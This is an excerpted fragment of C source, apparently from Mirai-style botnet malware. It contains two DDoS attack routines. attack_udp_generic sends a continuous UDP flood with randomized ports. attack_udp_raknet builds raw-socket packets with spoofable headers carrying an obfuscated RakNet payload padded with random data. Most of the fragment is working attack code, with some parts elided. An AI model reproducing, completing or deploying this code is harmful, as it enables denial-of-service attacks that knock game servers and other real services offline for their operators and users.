...
void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            ...
            if (sport == 0xffff)
                udph->source = htons(rand_next());
            if (dport == 0xffff)
                udph->dest = htons(rand_next());
...
void attack_udp_raknet(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    if (pkts == NULL) return;
    ...
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    char *raknet_payload;
    int raknet_payload_len;
    uint16_t min_len = 12;
    uint16_t max_len = 48;

    table_unlock_val(TABLE_ATK_RAKNET);
    raknet_payload = table_retrieve_val(TABLE_ATK_RAKNET, &raknet_payload_len);
...
#endif
        free(pkts);
        table_lock_val(TABLE_ATK_RAKNET);
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        uint16_t data_len = min_len + (rand_next() % (max_len - min_len + 1));
        ...
        int copy_len = (raknet_payload_len < data_len) ? raknet_payload_len : data_len;
        util_memcpy(data, raknet_payload, copy_len);
        
        if (copy_len < data_len) {
            rand_str(data + copy_len, data_len - copy_len);
        }
    }
